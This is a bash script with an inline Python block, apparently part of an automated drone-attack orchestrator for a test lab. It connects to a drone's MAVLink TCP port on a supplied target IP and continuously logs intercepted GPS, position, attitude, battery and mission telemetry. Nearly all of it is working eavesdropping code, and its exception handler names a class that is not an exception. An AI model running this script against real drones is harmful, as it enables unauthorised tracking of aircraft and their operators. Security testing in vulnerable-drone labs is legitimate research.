#!/usr/bin/env bash
set -euo pipefail

# Attack: Drone GPS & Telemetry Detection (MAVLink Eavesdropping, MTD-aware)
# Target Service: DRONE_MAVLINK_TCP (Default Port 5760)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (MAVLink TCP 연결을 기본으로 가정)
case "${TARGET_SERVICE:-DRONE_MAVLINK_TCP}" in
    DRONE_MAVLINK_TCP)
        TARGET_PORT="${TARGET_PORT:-5760}"
        ;;
    DRONE_MAVLINK)
        TARGET_PORT="${TARGET_PORT:-14550}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK_TCP})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=drone-gps-telemetry-detection src=Drone-GPS-&-Telemetry-Detection.md"
log "[BLOCK 1] type=python (MAVLink Telemetry Stream Detector)"

# Python 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
# `curses` 라이브러리는 제거하고, 데이터를 표준 출력으로 로깅합니다.
sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
from pymavlink import mavutil
import time

# --- Dynamic Target Acquisition ---
if len(sys.argv) != 2:
    print("Usage: python telemetry-detection.py <ip:port>")
    sys.exit(1)
    
target_ip, target_port_str = sys.argv[1].split(':', 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port: {target_port_str}")
    sys.exit(1)
# ----------------------------------

def main(target_ip, target_port):
    try:
        # MAVLink TCP 연결 시도
        connection = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}', timeout=5)
        print(f"[INFO] Connecting to MAVLink endpoint {target_ip}:{target_port}...")

        # 첫 번째 HEARTBEAT 메시지를 기다립니다.
        connection.wait_heartbeat()
        print(f"[INFO] Heartbeat received (System ID: {connection.target_system}, Component ID: {connection.target_component})")
        print("[INFO] Starting real-time telemetry message detection loop. Logging all detected messages...")

        # 관심 있는 MAVLink 메시지 타입 목록
        INTEREST_MSGS = (
            'HEARTBEAT', 'SYS_STATUS', 'GPS_RAW_INT', 'GLOBAL_POSITION_INT', 
            'ATTITUDE', 'ALTITUDE', 'BATTERY_STATUS', 'VFR_HUD', 'STATUSTEXT', 
            'MISSION_CURRENT', 'NAV_CONTROLLER_OUTPUT', 'RADIO_STATUS'
        )

        while True:
            # 메시지 수신 (논블로킹/타임아웃으로 변경)
            msg = connection.recv_match(blocking=True, timeout=0.01)
            
            if msg:
                msg_type = msg.get_type()
                
                # 관심 있는 메시지인 경우 상세 로그 출력
                if msg_type in INTEREST_MSGS:
                    # 메시지를 딕셔너리로 변환하여 로깅
                    print(f"[{msg_type}] {msg.to_dict()}")
                
    except mavutil.MavlinkConnection as e:
        print(f"[ERROR] Connection failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[CRITICAL ERROR] Attack execution failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main(target_ip, target_port)
PY

log "[BLOCK 2] type=control (In-Foreground Execution)"
# 공격은 Python 인라인 블록에서 포그라운드로 실행되며, Orchestrator에 의해 라이프사이클이 관리됩니다.